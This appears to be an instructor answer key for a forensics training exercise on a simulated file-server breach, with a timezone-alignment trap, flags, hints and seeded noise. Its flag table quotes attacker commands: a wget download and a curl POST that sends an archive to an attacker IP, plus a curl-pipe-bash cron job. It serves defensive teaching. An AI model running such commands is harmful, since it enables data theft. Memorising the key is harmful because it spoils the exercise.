# DF-14 "The Midnight Exfil" — Instructor Answer Key

**Scenario:** Meridian Finance file server `fin-srv-01` breached overnight. Trainee
ingests two sources into Timesketch, reconstructs the kill chain, and exports a
narrative that feeds the DF-14.3 executive summary.

**Sources (staged in `/home/user/df14/`):**
- `timeline.plaso` — host artifacts from `fin-srv-01` (auth.log, jsmith bash
  history, dropped tool, cron persistence, known_hosts, exfil archive).
- `external-events.jsonl` — VPN gateway feed.

## The timezone trap (core of the exercise)
Host logs are **server local time, America/New_York (EST = UTC-5)** but were
ingested **as-is (UTC)**, so in Timesketch they sit in the **02:xx** band. The
VPN feed is **true UTC**, sitting in the **07:xx** band. Same intrusion, two
clocks. The trainee must shift host events **+5h** (or VPN −5h) to align them.

Pivot to spot it: VPN `auth SUCCESS jsmith ... assigned_ip=10.10.10.66` at
**07:12:05Z** is the same session as the host SSH brute-force from
**10.10.10.66** starting **02:14:10**. ~5h apart but only ~2 min apart in
reality → host clock is EST.

The VPN-assigned `10.10.10.66` is the thread that ties the external account
compromise (real attacker IP `198.51.100.66`, no MFA) to the on-host activity.

## Flags (one per kill-chain phase)
| # | Phase | Evidence | Flag answer |
|---|-------|----------|-------------|
| F1 | Initial Access | auth.log `Accepted password for jsmith from 10.10.10.66` | **02:17:33** local (07:17:33Z) successful SSH after brute force |
| F2 | Execution | bash_history `wget http://198.51.100.66/lin_enum.sh`; `/tmp/lin_enum.sh` MACB | dropped tool **lin_enum.sh** |
| F3 | Persistence | `/etc/cron.d/apache-maintenance` (curl-pipe-bash every 10 min) | **/etc/cron.d/apache-maintenance** |
| F4 | Lateral Movement | bash_history `ssh dbadmin@192.168.0.60`; known_hosts gains that host | internal DB host **192.168.0.60** |
| F5 | Exfiltration | bash_history `tar` + `curl -X POST ... http://198.51.100.66:8080/upload`; `/tmp/fin_backup.tar.gz`; VPN `bytes_out=503316480` | exfil to **198.51.100.66:8080** (~480 MB) |

## Tiered hints
- **H1:** Two timelines, two clocks. Sort ascending and look at the gap between
  the first VPN event and the first host login attempt.
- **H2:** Filter host events to `username:jsmith` and tag the first
  *successful* SSH login. Where did the source IP come from?
- **H3:** Read jsmith's command history in order — recon, then a download.
  What landed in `/tmp`?
- **H4:** Something was written under `/etc/cron.d/`. When (file mtime), and what
  does it run?
- **H5:** Follow the data out: a `tar` then a `curl POST`. Corroborate the volume
  with the VPN `data_transfer` event.

## Noise seeded (must be filtered out)
- Benign 2025-11-11 business-hours logins (jsmith 09:02, mwong 11:18) in auth.log.
- Legit cron: `/etc/crontab`, `/etc/cron.d/php-sessionclean`.
- Two benign VPN sessions on 2025-11-11 (`s-77f1`, `s-77f2`).
- Normal finance files dated 2025-11-11 in `/srv/finance`.

## Win condition
All five phases tagged with correct (normalized) times + a short timeline
narrative naming the compromised account, the persistence mechanism, the lateral
target, and the exfil destination/volume.
